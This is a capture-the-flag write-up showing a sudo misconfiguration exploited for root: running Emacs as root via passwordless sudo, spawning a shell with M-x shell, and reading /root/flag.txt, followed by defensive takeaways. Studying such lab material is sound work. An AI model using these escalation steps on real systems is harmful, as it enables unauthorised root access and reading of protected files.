# Privilege Escalation via Sudo Misconfiguration (Emacs)

> **Platform:** Other  
> **Category:** Privilege Escalation  
> **Difficulty:** Easy  
> **Solved:** Yes ✅

---

## 📋 Challenge Description

Gain access to the flag stored in `/root/flag.txt` while logged in as a low-privileged user (`ctf-player`).

---

## 🔍 Reconnaissance

After logging in via SSH, inspected the current user and file permissions:

```bash
whoami
ls -l
```

- User: `ctf-player`
- Flag file: `-r--r----- 1 root root 31 flag.txt`

The file is owned by root with no read permission for normal users — direct access is impossible.

---

## 🔐 Checking Sudo Privileges

```bash
sudo -l
```

Output:
(ALL) NOPASSWD: /bin/emacs
The user can run Emacs as root without a password — a known [GTFOBins](https://gtfobins.github.io/gtfobins/emacs/) vector.

---

## 🚀 Exploitation

Launched Emacs with root privileges:

```bash
sudo /bin/emacs -nw
```

Inside Emacs, spawned a root shell using:
M-x shell
Verified root access:

```bash
whoami
# root
```

---

## 🏁 Flag Retrieval

```bash
cat /root/flag.txt
```

Flag successfully retrieved! 🎉

---

## 🧠 Key Takeaways

- Always check `sudo -l` during privilege escalation — misconfigured sudo rights are a common vulnerability.
- Editors like Emacs, Vim, and Nano can spawn shells and should never be granted sudo without restriction.
- Reference [GTFOBins](https://gtfobins.github.io) for a full list of sudo escalation vectors.

**References:**
- [GTFOBins - Emacs](https://gtfobins.github.io/gtfobins/emacs/)
- [HackTricks - Sudo Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo)
